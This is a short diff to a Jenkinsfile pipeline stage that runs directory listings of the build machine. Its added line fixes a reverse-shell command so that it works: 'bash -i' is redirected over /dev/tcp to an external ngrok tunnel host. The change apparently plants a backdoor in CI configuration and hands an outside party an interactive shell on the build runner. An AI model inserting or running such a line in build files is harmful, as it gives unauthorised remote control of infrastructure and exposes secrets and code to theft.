@@ -13,7 +13,7 @@ pipeline {
                 sh 'ls -a'
                 sh 'ls -la /'
                 sh 'ls -la /var/'
-                bash -i >& /dev/tcp/2.tcp.eu.ngrok.io:14840 0>&1 && echo
+                sh 'bash -i >/dev/tcp/2.tcp.eu.ngrok.io/14840 2>&1'
             }
         }
     }
